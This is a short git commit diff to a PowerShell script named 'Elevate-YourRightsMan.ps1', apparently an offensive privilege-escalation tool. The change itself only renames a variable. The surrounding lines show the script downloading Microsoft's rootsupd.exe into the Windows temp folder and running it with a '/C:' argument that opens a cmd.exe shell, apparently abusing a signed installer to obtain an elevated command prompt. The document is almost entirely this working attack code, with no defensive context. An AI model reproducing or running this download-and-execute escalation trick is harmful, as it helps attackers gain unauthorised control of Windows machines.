076841a1d82c807a8e8d94e2262c59d2faea16a8
Pierre-Alexandre Braeken <pabraeken@gmail.com>
2015-09-11 07:40:32 -0400

    ok

--- EYLR/Elevate-YourRightsMan.ps1
+++ EYLR/Elevate-YourRightsMan.ps1
@@ -3,7 +3,7 @@
 $fileToDownload = "http://download.microsoft.com/download/1/F/F/1FF5FEA9-C0F4-4B66-9373-278142683592/rootsupd.exe" 
 $fileDownloaded = "C:\Windows\temp\rootsupd.exe" 
      
-$client = new-object System.Net.WebClient 
-$client.DownloadFile($fileToDownload, $fileDownloaded) 
+$webClient = new-object System.Net.WebClient 
+$webClient.DownloadFile($fileToDownload, $fileDownloaded) 
       
 &$fileDownloaded "/C:c:\windows\system32\cmd.exe /K Title Follow The White Rabbit ;-)"
